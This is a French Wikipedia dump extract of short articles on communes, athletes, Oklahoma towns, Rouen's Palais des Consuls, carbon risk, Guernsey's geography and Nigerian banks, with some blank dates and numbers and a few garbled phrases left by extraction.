Typologie.
Au , Aulhat-Flat est catégorisée commune rurale à habitat dispersé, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle est située hors unité urbaine. Par ailleurs la commune fait partie de l'aire d'attraction de Clermont-Ferrand, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de à moins de .
Toponymie.
Il convient de se reporter aux articles consacrés aux anciennes communes fusionnées.
Histoire.
Créée par un arrêté préfectoral du 18 novembre 2015, elle est issue du regroupement des communes d'Aulhat-Saint-Privat et de Flat qui deviennent des communes déléguées. Le chef-lieu de la commune nouvelle est fixé à Flat.
Politique et administration.
Jusqu'aux prochaines élections municipales de 2020, le conseil municipal de la nouvelle commune est constitué de l'ensemble des conseillers municipaux des anciennes communes. Les maires des anciennes communes sont de droit maires délégués.
Économie.
Il convient de se reporter aux articles consacrés aux anciennes communes fusionnées.
Culture locale et patrimoine.
Lieux et monuments.
Il convient de se reporter aux articles consacrés aux anciennes communes fusionnées.
Personnalités liées à la commune.
Il convient de se reporter aux articles consacrés aux anciennes communes fusionnées.

</doc>
<doc id="9624828" url="https://fr.wikipedia.org/wiki?curid=9624828" title="Flabellum gardineri">
Flabellum gardineri

Flabellum gardineri est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9624831" url="https://fr.wikipedia.org/wiki?curid=9624831" title="74e brigade de sécurité (Allemagne)">
74e brigade de sécurité (Allemagne)



</doc>
<doc id="9624833" url="https://fr.wikipedia.org/wiki?curid=9624833" title="Youssef Toutouh">
Youssef Toutouh

Youssef Toutouh, né le à Copenhague au Danemark, est un footballeur dano-marocain évoluant au poste de Milieu offensif.
Biographie.
Carrière en club.
Le , libre de tout contrat après son départ du FC Copenhague, il s'engage pour deux saisons avec l'AGF Aarhus.
Carrière internationale.
Né au Danemark de parents originaires du Rif marocain, Youssef Toutouh qui n'a aucunement été appelé par la sélection danoise, a été ciblé par l'entraîneur marocain Badou Zaki qui a montré ses intérêts pour le joueur danois en lui rendant visite en décembre 2015, pour un accord entre le joueur d'origine marocaine et la Fédération royale marocaine de football. Le joueur semble être convaincu par l'entraîneur et aurait finalement tranché en faveur du Maroc.

</doc>
<doc id="9624842" url="https://fr.wikipedia.org/wiki?curid=9624842" title="Championnat d'Antigua-et-Barbuda de football 2000-2001">
Championnat d'Antigua-et-Barbuda de football 2000-2001

La saison 2000-2001 du Championnat d'Antigua-et-Barbuda de football est la trentième édition de la "Premier Division", le championnat de première division à Antigua-et-Barbuda. Les douze formations de l'élite sont regroupées au sein d'une poule unique où elles s'affrontent deux fois, à domicile et à l'extérieur. En fin de saison, les deux derniers du classement sont relégués et remplacés par les deux meilleurs clubs de "First Division".
C'est l'Empire FC, triple tenant du titre, qui remporte à nouveau la compétition cette saison après avoir terminé en tête du classement final, avec vingt-et-un points d'avance sur Bassa SC. Il s’agit du treizième titre de champion d'Antigua-et-Barbuda de l'histoire du club.
Compétition.
Le barème de points servant à établir le classement se décompose ainsi :

</doc>
<doc id="9624843" url="https://fr.wikipedia.org/wiki?curid=9624843" title="North Canadian River">
North Canadian River

La North Canadian River, appelée Oklahoma River à l'intérieur des limites de la ville d'Oklahoma City depuis 2004, est un cours d'eau nord-américain, affluent de la Canadian. Long de , il traverse les États américains de l'Oklahoma, Texas et Nouveau-Mexique.

</doc>
<doc id="9624848" url="https://fr.wikipedia.org/wiki?curid=9624848" title="Palais des Consuls (Rouen)">
Palais des Consuls (Rouen)

Le palais des Consuls est un immeuble de Rouen de style Art déco, produit de la Reconstruction, situé en bord de Seine, et destiné initialement à accueillir la Chambre de commerce. Il est l'un des éléments constitutifs de la « reconstruction du centre ville », entamée en 1947, qui se voit attribuer en 2001 le label "Architecture contemporaine remarquable".
Situation.
Le palais des Consuls est situé sur le quai de la Bourse, entre la rue du docteur Robert-Rambert, la rue Jacques-Lelieur et le passage Saint-Étienne-des-Tonneliers. Il se trouve à côté du théâtre des Arts.
Historique.
Un premier palais des Consuls est construit en 1743 par l'architecte Jean-François Blondel. Une annexe est édifiée en 1892 sur les plans de Lucien Lefort.
Le , lors des bombardements de la Semaine rouge, le bâtiment est en flammes.
La première pierre du nouveau palais des Consuls est posée en 1952. Il est l'œuvre de quatre architectes : Pierre Chirol, Robert Flavigny, François Herr et Roger Pruvost. Il est inauguré le par Paul Ramadier.
Le coût élevé de la maintenance du bâtiment de a décidé son occupante historique, la CCI de Rouen, à en déménager. Un appel à projets est lancé le pour la reprise du palais des Consuls, qui aboutit à un projet de reconversion en appartements, résidence pour seniors, logements locatifs et hôtel visant la distinction « palace » d'ici à fin 2023 au mieux.
En , on procède à la destruction du tribunal de commerce qui donnait sur la rue Saint-Hilaire-des-Tonneliers. En , le chantier de rénovation et de construction / extension (gros œuvre) se situe au niveau R+7 (final : R+9).
Description.
La façade principale donne sur le quai de la Bourse. Elle est constituée d'un socle, d'un étage noble monumental et d'un attique. En béton, le bâtiment est recouvert de pierre.
Les ferronneries sont de Raymond Subes. Les bas-reliefs sont de Maurice de Bus. Le mobilier intérieur a été dessiné par André Arbus et Jacques Adnet. Celui-ci a été mis en vente le .

</doc>
<doc id="9624849" url="https://fr.wikipedia.org/wiki?curid=9624849" title="Yukon (Oklahoma)">
Yukon (Oklahoma)

Yukon est une ville du comté de Canadian en Oklahoma, aux États-Unis.

</doc>
<doc id="9624851" url="https://fr.wikipedia.org/wiki?curid=9624851" title="Martin Matin (personnage)">
Martin Matin (personnage)



</doc>
<doc id="9624854" url="https://fr.wikipedia.org/wiki?curid=9624854" title="Sicherungs brigade 74">
Sicherungs brigade 74



</doc>
<doc id="9624855" url="https://fr.wikipedia.org/wiki?curid=9624855" title="Rauno Sappinen">
Rauno Sappinen

Rauno Sappinen, né le à Tallinn en Estonie, est un footballeur international estonien, qui évolue au poste de milieu offensif.
Biographie.
Carrière de joueur.
Rauno Sappinen dispute trois matchs en Ligue Europa.
Carrière internationale.
Rauno Sappinen compte trois sélections avec l'équipe d'Estonie depuis 2015. 
Il est convoqué pour la première fois par le sélectionneur national Magnus Pehrsson pour un match amical contre la Géorgie le (victoire 3-0).
Palmarès.
En club.
 Flora Tallinn

</doc>
<doc id="9624857" url="https://fr.wikipedia.org/wiki?curid=9624857" title="Risque carbone">
Risque carbone

Le risque carbone est un principe récent en économie, traitant du risque lié à l'émission de gaz à effet de serre par des acteurs économiques en raison de l'utilisation de sources d'énergie carbonées.
Origine du principe.
Le principe de risque carbone dans l'économie est introduit par un article de Florent Pratlong en 2006, puis popularisé par l'ONG anglaise Carbon Tracker et Al Gore à compter de 2011.
Description.
Le risque carbone propose une approche du risque qu'encourt un acteur économique (une entreprise, un secteur, un pays) en fonction de ses choix en matière d'économie carbonée. Considérant qu'un acteur économique, en particulier une entreprise, est responsable de ses choix économiques et de leurs impacts sur le changement climatique (principe de la responsabilité carbone des entreprises, c'est-à-dire le coût additionnel associé aux émissions de de l'entreprise), ceci fait peser sur cet acteur différents risques liés à la prise en compte de cette , selon le principe décrit par l'économiste britannique Arthur Cecil Pigou en 1920.
Le risque carbone est donc l'évaluation du risque que doit supporter l'acteur économique lors de ses choix stratégiques vis-à-vis de la prise en compte des externalités environnementales liées à son activité, dès lors que cet acteur ne les anticipe pas.
Évaluation du risque carbone.
L'évaluation du risque carbone passe d'abord par une quantification de la responsabilité carbone de l'acteur économique. L', indique Pratlong. Cet inventaire permet d'évaluer la vulnérabilité de l'acteur économique vis-à-vis de deux facteurs principaux du risque carbone :
L'évaluation du risque carbone permet par exemple d'anticiper la sensibilité des comptes d'une entreprise vis-à-vis de la mise en place d'une taxe carbone.
Gestion du risque.
Parmi les outils de gestion du risque carbone, il faut citer :
En 2019, le Fonds monétaire international conduit les premiers "stress tests" climatiques dans les pays les plus vulnérables, notamment aux Bahamas et en Jamaïque. En 2020, la Banque d'Angleterre et la Banque de France décident pour la première fois de mener un "stress test" climatique sur les bilans des banques et des assurances.
Positionnement des investisseurs.
À titre d'exemple, une limitation des investissements dans les secteurs fortement carbonés (charbon par exemple) est proposée par l'agence de notation Standard &amp; Poor's. En 2015, au moment de la COP21, le risque carbone est mis en valeur lors de certaines discussions, considérant que les enjeux entre risque financier et risque sanitaire et environnemental trouveront une réponse au travers d'une évaluation du risque carbone ; un rapport de Mark Carney, gouverneur de la Banque d'Angleterre, paru en , agite en effet le spectre d'une qui peut éclater dans le cas où la décarbonisation de l'économie ne se produisait pas, ou se produisait de manière trop brutale.
Une étude sur 679 compagnies pétrolières américaines entre 1999 et 2018 montre une inflexion depuis l’accord de Paris de 2015. Les entreprises propriétaires des plus grosses réserves prouvées ont une valorisation supérieure aux autres. Celles qui investissent pour développer de nouvelles réserves sont par contre dévalorisées. Les investisseurs pensent donc que les dépenses d’investissement engagées en ce moment pour faire croître les réserves disponibles ont peu de chances d'être utilisées. 
Un sondage auprès des investisseurs montre également qu'une large majorité considère que les risques financiers liés au changement climatique sont réels et qu’ils se matérialiseront dans les cinq ans à venir.
Des start-up gérées par des scientifiques analysent les risques liés au réchauffement climatique, et les agences de notation ou les fonds de pension se tournent vers elles pour des conseils, y prennent des participations ou bien forment leurs analystes à ce sujet. 
En , Larry Fink, fondateur de BlackRock, premier gestionnaire d’actifs mondial et premier investisseur des compagnies pétrolières, déclare : . Il s'engage à ne plus investir dans les entreprises dont l’activité liée au charbon dépasserait les 25 %, et à utiliser son pouvoir actionnarial pour pousser les directions à prendre plus au sérieux la nécessité de réduire les émissions de gaz à effet de serre. Ces déclarations sont interprétées comme une inflexion majeure de la finance en matière de préoccupations environnementales.
En , Total annonce des dépréciations d'actifs pour 8,1 milliards de dollars, dont 7 milliards liés aux sables bitumineux au Canada et 800 millions liés au gaz naturel liquéfié en Australie, en raison de la faiblesse des cours du pétrole et de ses nouveaux objectifs climatiques. 

</doc>
<doc id="9624862" url="https://fr.wikipedia.org/wiki?curid=9624862" title="Mustang (Oklahoma)">
Mustang (Oklahoma)

Mustang est une ville du comté de Canadian en Oklahoma, aux États-Unis.

</doc>
<doc id="9624863" url="https://fr.wikipedia.org/wiki?curid=9624863" title="Dennis Rasmussen">
Dennis Rasmussen

&lt;dfn&gt;Dennis Rasmussen&lt;/dfn&gt; (né le à Västerås en Suède) est un joueur professionnel suédois de hockey sur glace. Il évolue au poste d'attaquant.
Biographie.
Carrière en club.
Formé au Surahammars IF, il rejoint les équipes de jeunes du VIK Västerås HK. Il commence sa carrière en senior avec l'équipe première dans l'Allsvenskan en 2008. En 2011, il découvre l'Elitserien avec le Växjö Lakers HC. Il signe un contrat d'un an avec les Blackhawks de Chicago en 2014. Il est assigné aux IceHogs de Rockford, club ferme des Blackhawks dans la Ligue américaine de hockey. Le , il joue son premier match dans la Ligue nationale de hockey avec les Blackhawks face aux Predators de Nashville et marque son premier but.
Carrière en équipe nationale.
Il représente la Suède au niveau international. Il a participé aux sélections jeunes.

</doc>
<doc id="9624868" url="https://fr.wikipedia.org/wiki?curid=9624868" title="Rue du Docteur-Thomas">
Rue du Docteur-Thomas

La rue du Docteur-Thomas est une voie de la commune de Reims, située au sein du département de la Marne, en région Grand Est.
Origine du nom.
Elle porte le nom de l'homme politique français Alfred Thomas (1826-1899).
Historique.
Ancienne « rue Saint-Thomas », elle est renommée « rue du Docteur-Thomas » en 1903.
Bâtiments remarquables et lieux de mémoire.
Au n°13 de la rue se trouve un temple du culte antoiniste, de style néo-roman et néo-gothique, dédicacé le , par Catherine Antoine, l'épouse du fondateur du culte.

</doc>
<doc id="9624870" url="https://fr.wikipedia.org/wiki?curid=9624870" title="Pamela Fryman">
Pamela Fryman

Pamela Fryman, née le à Philadelphie, est une réalisatrice et productrice de "sitcom" américaine. Elle est surtout connue pour son travail sur la série télévisée "How I Met Your Mother".
Biographie.
Fryman grandit à Philadelphie.
Elle obtient son premier emploi sur le plateau du "The John Davidson Show", où elle assiste le coordonnateur. Par la suite, elle est assistante de production et secrétaire sur "Santa Barbara", puis devient assistante réalisatrice. En 1993, le producteur Peter Noah, avec qui elle a travaillé sur "Dream House", lui donne l'occasion de réaliser un épisode de la "sitcom ".
Fryman réalisera la plupart des épisodes de "How I Met Your Mother". Son talent sera vanté par le créateur de la série Craig Thomas. Bien qu'elle n'avait pas pensé orienter sa carrière vers la réalisation, dans une entrevue accordée à "Variety", Fryman dit que 
Distinctions.
Fryman a remporté deux "Daytime Emmy Awards" (en 1990 et 1991) pour son travail sur "Santa Barbara". Elle a été nommée pour quatre "DGA awards", trois pour sa réalisation de "Frasier" un pour "Just Shoot Me".
En 2011, Fryman reçoit le "Dorothy Arzner Award", visant à reconnaître le rôle important des réalisatrices de télévision et de cinéma.

</doc>
<doc id="9624874" url="https://fr.wikipedia.org/wiki?curid=9624874" title="Ralston (Écosse)">
Ralston (Écosse)

Ralston ("Baile Raghnaill" en gaélique , "Ralphstoun" en scots ) est un village d'Écosse, situé dans le council area et région de lieutenance du Renfrewshire, situé en banlieue de Paisley.

</doc>
<doc id="9624879" url="https://fr.wikipedia.org/wiki?curid=9624879" title="Dylan Bruce">
Dylan Bruce

Dylan Bruce (né le ) est un acteur canadien.
Biographie.
Dylan Bruce est né le à Vancouver, en Colombie-Britannique, et a été élevé à Boundary Bay. Dylan Bruce a fréquenté l'Université de Washington à Seattle, à Washington, et a obtenu un diplôme en théâtre et économie avant de déménager à Los Angeles, en Californie. Il a lancé sa carrière en tant que model à Seattle à travers Seattle Models Guild. Il est apparu sur la couverture du numéro du de Daily Variety.
En 2013 il joue le personnage de Paul Dierden, petit-ami de Beth Childs et moniteur, puis petit-ami de Sarah Manning dans la série Orphan Black.
il a joué le rôle de Adam Donner dans Arrow (saison 2). Il a également joué dans "Un roman d'amour".
En 2017 il commence à jouer dans la série Midnight, Texas où il interprète le rôle de Bobo Winthrop.

</doc>
<doc id="9624886" url="https://fr.wikipedia.org/wiki?curid=9624886" title="Martavis Bryant">
Martavis Bryant

Martavis Bryant, né le à Calhoun Falls en Caroline du Sud, est un sportif professionnel américain de football américain qui évolue au poste de wide receiver, actuellement agent libre.
Sélectionné en lors du quatrième tour de la draft 2014 de la NFL par la franchise des Steelers de Pittsburgh, il y joue pendant quatre saisons (20184-2017) avant de rejoindre les Raiders d'Oakland (2018), les Argonauts de Toronto de la LCF (2020), les de l'Indoor Football League (2021), les Elks d'Edmonton de la LCF (2022), les de la (2022), les de la XFL (2023) et les Cowboys de Dallas (2023) qui le libèrent en .
Au niveau universitaire, il a joué pour les Tigers de l'université de Clemson pendant trois saisons (2011-2013) dans la NCAA Div qui le libèrent en mai 2024ision I FBS et son Atlantic Coast Conference.

</doc>
<doc id="9624894" url="https://fr.wikipedia.org/wiki?curid=9624894" title="Nikita Baranov">
Nikita Baranov

Nikita Baranov, né le à Tallinn en Estonie, est un footballeur international estonien, qui évolue au poste de défenseur.
Biographie.
Carrière de joueur.
Nikita Baranov dispute quatre matchs en Ligue des champions, et deux matchs en Ligue Europa.
Carrière internationale.
Nikita Baranov compte trois sélections avec l'équipe d'Estonie depuis 2015. 
Il est convoqué pour la première fois par le sélectionneur national Magnus Pehrsson pour un match amical contre la Géorgie le (victoire 3-0).

</doc>
<doc id="9624896" url="https://fr.wikipedia.org/wiki?curid=9624896" title="Géographie de Guernesey">
Géographie de Guernesey

La géographie de Guernesey englobe à la fois l'île principale du Bailliage de Guernesey, plus les trois îles de Sercq, d'Aurigny et de Herm formant toutes les quatre avec l'île de Jersey, les îles anglo-normandes situées dans le golfe de Saint-Malo à l'ouest de la côte normande.
Géographie physique.
Guernesey, Aurigny, Herm, Sercq, et quelques autres petits îlots ont une superficie totale de carrés et un littoral d'environ . L'île de Guernesey a une superficie totale de carrés. Guernesey se trouve à une cinquantaine de kilomètres à l'ouest de la côte normande et au sud de Weymouth, en Angleterre. L'île de Lihou ainsi que celle de la paroisse de Valle sont rattachées à Guernesey par des chaussées accessibles à marée basse (Braye du Valle). Au sud-ouest, le terrain est surtout constitué de basses collines. Le point le plus élevé à Guernesey est situé à "Hautnez" (), à Aurigny au "Le Rond But" (), dans l'île de Jethou () et Herm (). Le groupe d'îlots des Casquets possèdent un remarquable phare.
Guernesey contient deux principales régions géographiques, le "Haut Pas", un plateau méridional, et le "Bas Pas" de faible altitude avec des plages de sable au nord. Le Haut Pas est plus rurale des deux, tandis que le Bas Pas est plus résidentiel et industrialisée. Les ressources naturelles sont l'élevage et les terres cultivées. L'île de Guernesey possède un port en eau profonde à Saint-Pierre-Port.
Climat.
Le climat est tempéré avec des hivers doux et des étés chauds et ensoleillés. Les mois les plus chauds sont juillet et août, quand les températures sont généralement autour de . En moyenne, le mois le plus froid est février avec une température moyenne de l'air de . La neige tombe rarement, et elle est plus susceptible de tomber en février. La température descend rarement en dessous de zéro, même si le vent fort arctique peut parfois se faire sentir. Les mois les plus pluvieux sont novembre (en moyenne ), décembre (en moyenne ) et janvier (moyenne ). juillet est, en moyenne, le mois le plus ensoleillé avec 250 heures d'ensoleillement enregistrées; décembre, le moins avec 58 heures d'ensoleillement enregistrées.
Géographie humaine.
La géographie de Guernesey est étroitement liée à celle de la Normandie voisine. Le littoral normand a évolué au cours des millénaires. Au moment de la Pangée, l'Europe était accolée au continent nord-américain. Elle s'en écarte progressivement, pour que l'océan Atlantique s'y engouffre. Le littoral normand va donc connaître plusieurs phases au gré des régressions et des transgressions marines. Durant le Pléistocène, le niveau de la mer va remonter très au-dessus du niveau actuel. Il y a , le niveau de la Manche était à + NGF (nivellement général de la France) si on se réfère au croquis stratigraphique de D. Michelet, de la fouille archéologique de Port-Pignot dans le Nord Cotentin. Le territoire de la commune était donc sous les eaux, excepté le petit hameau de La Houlgate. Inversement, le littoral va se retirer à plus de des côtes actuelles. Il y a , le développement des calottes de glaces autour des pôles et des principaux glaciers va faire baisser le niveau de la mer d'un peu plus de .
Ce va-et-vient maritime a progressivement détaché les îles Anglo-Normandes des côtes du Cotentin. Il était encore possible de se rendre à pied à Guernesey, il y a . Il faudra attendre 4000 ans avant notre ère pour que Jersey, Chausey et les Minquiers ne soient plus accessibles par voie de terre.
De cette transgression marine, il subsiste le mythe de la forêt de Scissy qui devait alors s'étendre entre les îles Anglo-Normandes et les côtes du Cotentin. De nombreuses souches fossilisées ont été collectées sur la côte et sont actuellement au musée de Cherbourg. Les pêcheurs rapportent que certaines zones de pêche sont inaccessibles, du fait que leur filets s'arrachent sur des amoncellements de bois.

</doc>
<doc id="9624900" url="https://fr.wikipedia.org/wiki?curid=9624900" title="Guaranty Trust Bank">
Guaranty Trust Bank

Guaranty Trust Holding Company PLC, également connue sous le nom de GTCO PLC, est un groupe multinational de services financiers proposant des services de banque de détail et d'investissement, de gestion de retraite, de gestion d'actifs et de paiement. Son siège social est situé à Victoria Island, à Lagos, au Nigéria. GTCO Plc a été créée en juillet 2021 à la suite de la réorganisation de Guaranty Trust Bank PLC (ou GTBank) en société holding.
Histoire.
Guaranty Trust Bank Plc a été créée en 1990 en tant que société à responsabilité limitée (SARL), réglementée par la Banque centrale du Nigéria, La banque a commencé ses activités en tant que banque commerciale en 1991. Elle a inauguré son premier siège social le 11 février 1991, à The Plaza, Adeyemo Alakija, Victoria Island, Lagos. En 1992, la banque a ouvert deux succursales à Lagos (Ikeja et Broad Street), ainsi que sa première succursale à Kano, dans l'arrière-pays, et une succursale à Port-Harcourt en 1993.
En septembre 1996, Guaranty Trust Bank plc est devenue une société cotée en bourse et a reçu le Prix du mérite du président de la Bourse du Nigéria. La banque a obtenu une licence bancaire universelle en février 2002 et a été désignée banque de règlement par la Banque centrale du Nigéria (CBN) en 2003. La même année, elle a créé des filiales en Gambie et en Sierra Leone.
Le 26 juillet 2007, GTBank est devenue la toute première banque subsaharienne et la première société par actions nigériane à être cotée à la Bourse de Londres et à la Deutsche Börse. Cette introduction en bourse a permis de lever 750 000 000 USD. La même année, elle a placé avec succès la première émission d'euro-obligations privées du Nigéria sur les marchés financiers internationaux.
L'euro-obligation de 500 000 000 USD de GTBank était la toute première émission d'euro-obligations de référence par une entreprise nigériane et le deuxième programme d'euro-obligations de GTBank en cinq ans
Les dettes à long terme de Guaranty Trust Bank plc sont notées BB- par Standard &amp; Poor's et AA− par Fitch Ratings, soit les notes les plus élevées pour une banque nigériane.
Le 12 mars 2008, GTBank a obtenu une licence bancaire pour le Royaume-Uni auprès de la Financial Services Authority.
Guaranty Trust Bank Limited est partenaire d'Eko Atlantic City, une île nouvellement créée (820 ha) dans l'océan Atlantique, adjacente à l'île Victoria, à Lagos. Elle accueillera le nouveau quartier financier. La construction d'Eko Atlantic City a débuté en 2009 et devait s'achever en 2016.
Pour commémorer le anniversaire de la banque, la Poste nigériane a émis une série de timbres-poste anniversaire de GTBank. C'était la première fois au Nigéria qu'une entreprise était ainsi honorée.
En 2011, la banque est devenue la plus grande banque du Nigéria en termes de capitalisation boursière.
En 2013, la banque a acquis une participation de 70% dans le groupe Fina Bank pour un paiement en espèces de 100 millions de dollars américains Les succursales et filiales de Fina Bank ont été rebaptisées GT Bank peu de temps après.
En mai 2021, GT Bank a annoncé une modification de sa structure d'entreprise, passant à une société holding et scindant ses activités bancaires et autres en filiales. Ce projet de changement a été ratifié par ses actionnaires le 4 décembre 2020, à l'issue d'une assemblée générale ordonnée par le tribunal.

</doc>
<doc id="9624904" url="https://fr.wikipedia.org/wiki?curid=9624904" title="Rue Mennesson-Tonnelier">
Rue Mennesson-Tonnelier

La rue Mennesson-Tonnelier est une voie de la commune de Reims, située au sein du département de la Marne, en région Grand Est.
Situation et accès.
La rue Mennesson-Tonnelier appartient administrativement au Quartier Laon Zola - Neufchâtel - Orgeval à Reims.
Origine du nom.
Elle porte le nom de Jean Louis Théodore Mennesson-Tonnelier (1789-1875) maire de Reims en 1848-1849.
Historique.
Ancienne « rue du Square-Amélie-Doublié », du nom d'Amélie Doublié, bienfaitrice de la ville, elle prend sa dénomination actuelle en 1887.

</doc>
<doc id="9624909" url="https://fr.wikipedia.org/wiki?curid=9624909" title="HMS Totem (P352)">
HMS Totem (P352)



</doc>
<doc id="9624914" url="https://fr.wikipedia.org/wiki?curid=9624914" title="Loi NOTREe">
Loi NOTREe



</doc>
<doc id="9624915" url="https://fr.wikipedia.org/wiki?curid=9624915" title="Fidelity Bank Nigeria">
Fidelity Bank Nigeria

Fidelity Bank Nigeria est l'une des principales banques du Nigeria, dont le siège se trouve à Lagos. Elle est cotée sur le Nigerian Stock Exchange depuis mai 2005.
Histoire.
Elle est créée en 1988. Elle a progressivement étendu ses activités au Nigeria, notamment via l'acquisition des banques Manny, en 2005, et FSB International, la même année et Manny Bank Plc. . 
Elle a obtenu sa licence bancaire universelle en février 2001 et sa licence bancaire internationale en 2011. Lors de la consolidation du secteur bancaire nigérian en 2005, Fidelity Bank est présente dans tous les États et grandes villes du Nigéria, avec des fonds propres de premier rang de près d'un milliard de dollars américains. 
En 2022, elle est la 8 banque du Nigéria par capitalisation, avec 637 millions de dollars américains, et la 41 en Afrique. Ses actifs sont estimés à 7,99 milliards de dollars américains. Elle compte environ 250 agences au Nigéria. En 2022, elle acquiert la branche britannique de Union Bank of Nigeria. 
Depuis août 2020, son président est Mustafa Chike-Obi ; sa directrice exécutive est Pamela Shodipo, précédemment directrice de la branche béninoise de United Bank for Africa, depuis février 2023.

</doc>
<doc id="9624920" url="https://fr.wikipedia.org/wiki?curid=9624920" title="Ivan Antonovitch Kupreanof">
Ivan Antonovitch Kupreanof



</doc>
<doc id="9624922" url="https://fr.wikipedia.org/wiki?curid=9624922" title="Lignes de Floriana">
Lignes de Floriana

Les lignes de Floriana (en ) sont un ensemble de lignes de fortifications à Il-Furjana (Floriana) à Malte. Elles entourent les fortifications de La Valette et forment les défenses extérieures de la capitale maltaise.
La construction des lignes commencent en 1636 par l'ordre de Saint-Jean de Jérusalem et elles sont modifiées tout au long des . Militairement, c'est lors du blocus de Malte (1798-1800) par la France qu'elles sont utilisées.
Les lignes de Floriana sont depuis 1998 inscrites sur la liste indicative maltaise du patrimoine mondial de l'Unesco.

</doc>
<doc id="9624923" url="https://fr.wikipedia.org/wiki?curid=9624923" title="Formule de trotter">
Formule de trotter



</doc>
<doc id="9624924" url="https://fr.wikipedia.org/wiki?curid=9624924" title="Floriana Lines">
Floriana Lines



</doc>
<doc id="9624925" url="https://fr.wikipedia.org/wiki?curid=9624925" title="Olivier Vernon">
Olivier Vernon

Olivier Alexander Vernon, né le à Miami en Floride, est un joueur professionnel américain de football américain. Il évolue au poste de defensive end dans la National Football League (NFL).
Il joue chez les Browns de Cleveland depuis 2019. Il a auparavant joué pour les Dolphins de Miami (2012-2015) et les Giants de New York (2016-2018).
Au niveau universitaire, il a joué pour les Hurricanes de Miami au sein de la NCAA Division I FBS.
Biographie.
Jeunesse.
Olivier Vernon joue pour l'équipe de football américain de l'American High School de Miami. Il est considéré comme une recrue 4 étoiles selon un classement du site internet Rivals.com et comme le defensive end de sa promotion.
Carrière universitaire.
Vernon intègre l'université de Miami et joue au poste de "defensive end" pendant trois ans pour l'équipe des Hurricanes de Miami, évoluant dans la Division I (FBS) de la NCAA.
Au cours de sa carrière universitaire, il totalise 9 sacks et 81 plaquages, dont 20,5 entraînant une perte de terrain.
Carrière professionnelle.
Dolphins de Miami.
Après la conclusion de sa troisième année universitaire en 2011, Verson se déclare éligible à la draft 2012 de la NFL. Le , il est sélectionné en tant que choix global lors du de la draft par les Dolphins de Miami.
Sa sélection met fin à 8 ans d'absence d'un joueur universitaire des Hurricanes de Miami sélectionné par les Dolphins de Miami. Le dernier joueur des "Hurricanes" à avoir été sélectionné par les Dolphins était Vernon Carey en 2004. Lamar Miller, un autre joueur des "'Canes" est également sélectionné par les "Dolphins" comme global lors du de la draft.
Le contre les Jets de New York, Vernon marque son premier touchdown dans la NFL après avoir récupéré le ballon dans la zone des buts après un punt contré par son coéquipier . Dans le même match, il bloque un field goal dans les dernières secondes du deuxième quart-temps.
Giants de New York.
Le , Vernon signe un contrat de 5 ans chez les Giants de New York pour , dont garantis. Son salaire annuel moyen de fait de Vernon le "defensive end" le mieux payé de la NFL. L'entraîneur Ben McAdoo le désigne comme titulaire au poste de defensive end en compagnie de Jason Pierre-Paul.
Lors de sa première année chez les Giants, Vernon débute les 16 matchs comme titulaire et enregistre sa meilleure année avec 8,5 sacks et 63 plaquages, ce qui lui vaut une sélection dans la seconde équipe All-Pro.
La saison suivante, le coordinateur défensif des Giants, , reconfirme Vernon comme titulaire au poste de defensive end. Il manque quatre matchs à la suite d'une blessure à la cheville. Le , en semaine, Vernon effectue quatre plaquages, dévie une passe et réussit la première interception de sa carrière lors de la défaite de 31 à 21 contre les 49ers de San Francisco. Le , les Giants de New York virent l'entraîneur principal Ben McAdoo à la suite du mauvais bilan provisoire de l'équipe, 2 victoires et 10 défaites, et ils désignent à sa place le coordinateur défensif Steve Spagnuolo comme intérimaire pour les quatre derniers matchs de la saison.
Vernon termine la saison 2017 avec 37 plaquages, dont 22 seul, 6,5 sacks, deux fumbles forcés, une interception et un sack lors des douze matchs joués, tous comme titulaire. Il reçoit une note globale de 84,2 de Pro Football Focus.
Le , les Giants annoncent qu'ils ont engagé comme entraîneur principal, le coordinateur offensif des Vikings du Minnesota, Pat Shurmur. Shumur engage alors , comme coordinateur défensif, qui change de tactique en passant de la défense 4-3 à la défense 3-4. En conséquence, Vernon passe du poste de defensive end à celui d'outside linebacker. Il est nommé titulaire à ce poste en compagnie de Kareem Martin en début de saison, aux côtés des inside linebackers et Alec Ogletree. Il manque cependant les cinq premiers matchs à la suite d'une nouvelle blessure à la cheville. C'est en semaine qu'il obtient ses meilleurs statistiques de la saison avec cinq plaquages seul, deux sacks et une passe déviée lors de la victoire de 30 à 27 contre les Bears de Chicago. Le , il est désigné comme remplaçant pour le Pro Bowl 2019. Le , il enregistre cinq plaquages combinés et 2,5 sacks lors de la défaite 35 à 36 contre les Cowboys de Dallas.
Il termine la saison avec 30 plaquages, dont 23 seul, sept sacks et une passe déviée lors des onze matchs débutés tous comme titulaire. Vernon obtient une note globale de 86,3 de Pro Football Focus en 2018, ce qui le classe comme meilleur défenseur à la course. Le , il est sélectionné pour jouer le Pro Bowl en remplacement de Khalil Mack, blessé.
Browns de Cleveland.
Le , Vernon et Odell Beckham Jr. sont acquis par les Browns de Cleveland en échange de Jabrill Peppers, de Kevin Zeitler et de leurs sélections de et tours de la draft 2019 de la NFL.

</doc>
<doc id="9624927" url="https://fr.wikipedia.org/wiki?curid=9624927" title="Access Bank">
Access Bank

Access Bank Plc, ou communément appelée Access Bank, est la filiale principale du groupe , conglomérat de services financiers dont le siège est basé à Lagos au Nigeria. Access Bank Group possède des filiales en République démocratique du Congo, au Ghana, au Kenya, au Nigeria, au Cameroun,au Rwanda, en Gambie, en Sierra Leone, en Zambie et au Royaume-Uni. Le groupe dispose également de bureaux de représentation en Chine, en Inde, au Liban et aux Emirats Arabes Unis. 
Après la fusion d'Access Bank plc et de Diamond Bank le 1er avril 2019, Access Bank plc est aujourd'hui la plus grande banque d'Afrique en nombre de clients, et la plus grande banque du Nigeriaen terme de capital.
En juin 2021, elle compte un portefeuille de 42 millions de clients.
Histoire.
La banque est fondée en 1988 et se constitue en tant que banque commerciale privée en Février 1989. Elle commence réellement ses opérations le 11 mai 1989, en établissant son premier bureau situé à Burma Road dans le quartier d’.
En mars 1998, Access Bank change de statut juridique et devient une société anonyme et dans la même année, le 18 novembre 1998, elle entre au Nigeria Stock Exchange.
En 2002, est nommé directeur général et , directeur général adjoint, avec pour mandat de faire passer la banque de la 65ème place au top 10 en l’espace de 5 ans.
En 2003, Access Bank lève plus de 14,5 milliards de nairas dans le cadre d'une offre publique, enregistrant une sursouscription de 133 %. Elle reçoit la même année le prix Hewlett Packard Award pour la meilleure implémentation d'une application bancaire de base ( 6.2) en Afrique de l'Ouest.
